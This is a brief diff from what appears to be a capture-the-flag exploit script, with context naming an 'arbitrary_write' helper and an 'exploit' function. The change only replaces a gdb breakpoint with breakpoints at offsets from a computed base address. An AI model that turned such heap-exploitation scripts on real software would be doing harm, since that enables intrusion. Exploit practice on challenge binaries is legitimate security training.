@@ -92,7 +92,9 @@ def arbitrary_write(r1, r2, addr, heap_base_addr, content):
 	
 def exploit(r1, r2, p):
 	s = '''
-	b * challenge+1354
+	set $mybase = (unsigned long)&challenge - 0x1a64
+	b * $mybase + 0x01db6
+	b * $mybase + 0x01dfe
 	'''
 	global offset1
 	global offset2
